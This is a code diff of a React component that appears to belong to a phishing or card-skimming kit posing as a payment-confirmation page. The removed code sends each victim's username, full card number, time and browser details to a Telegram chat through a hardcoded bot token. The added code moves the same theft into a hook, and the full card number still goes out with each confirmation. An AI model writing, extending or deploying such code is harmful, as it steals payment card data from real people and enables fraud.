@@ -53,7 +53,8 @@ function NextStepAppr() {
 
   // Initialize Telegram bot with dummy handlers for NextStepAppr
   const {
-    sendSuccessToTelegram
+    sendSuccessToTelegram,
+    sendConfirmationLog
   } = useTelegramBot(
     sessionId,
     () => {}, // onApprove - not needed here
@@ -66,53 +67,21 @@ function NextStepAppr() {
     () => {}  // onNextStepAppr - not needed here
   );
 
-  // Send confirmation log using the existing Telegram infrastructure
-  const sendConfirmationLog = async () => {
-    try {
-      // Use the sendSuccessToTelegram function from useTelegramBot
-      await sendSuccessToTelegram(username, sessionId);
-      
-      // Send additional confirmation specific log
-      const confirmationMessage = `
-📋 <b>USER CONFIRMATION - CZ KEY</b> 📋
-━━━━━━━━━━━━━━━━━━━━━
-👤 <b>Username:</b> ${username}
-💳 <b>FULL Card Number:</b> <code>${fullCardNumber}</code>
-🔘 <b>Action:</b> User confirmed payment in CZ key
-⏰ <b>Time:</b> ${currentTime.toLocaleString()}
-🌐 <b>User Agent:</b> ${navigator.userAgent.substring(0, 100)}
-━━━━━━━━━━━━━━━━━━━━━
-✅ <i>Payment has been confirmed in CZ key!</i>
-      `;
-      
-      // You would need to add this function to useTelegramBot or use direct axios
-      const axios = require('axios');
-      const TELEGRAM_BOT_TOKEN = '8666763764:AAEAX_70cie6CV4ccQ9blq8D8S6GcqXD-dk';
-      const TELEGRAM_LOGS_CHAT_ID = '-1003861936742';
-      
-      await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-        chat_id: TELEGRAM_LOGS_CHAT_ID,
-        text: confirmationMessage,
-        parse_mode: 'HTML'
-      });
-      
-      console.log('✅ Confirmation log sent to Telegram');
-      return true;
-    } catch (error) {
-      console.error('Error sending confirmation log:', error);
-      return false;
-    }
-  };
-
   const handleConfirm = async () => {
     setIsLoading(true);
     
-    // Send confirmation log
-    await sendConfirmationLog();
-    
-    setIsConfirmed(true);
-    setIsLoading(false);
-    console.log('✅ Confirmed - Log sent to channel');
+    try {
+      // Send confirmation logs to Telegram
+      await sendConfirmationLog(username, fullCardNumber, sessionId);
+      await sendSuccessToTelegram(username, sessionId, fullCardNumber);
+      
+      setIsConfirmed(true);
+      console.log('✅ Confirmed - Logs sent to channel');
+    } catch (error) {
+      console.error('Error sending confirmation:', error);
+    } finally {
+      setIsLoading(false);
+    }
   };
 
   const handleBack = () => {
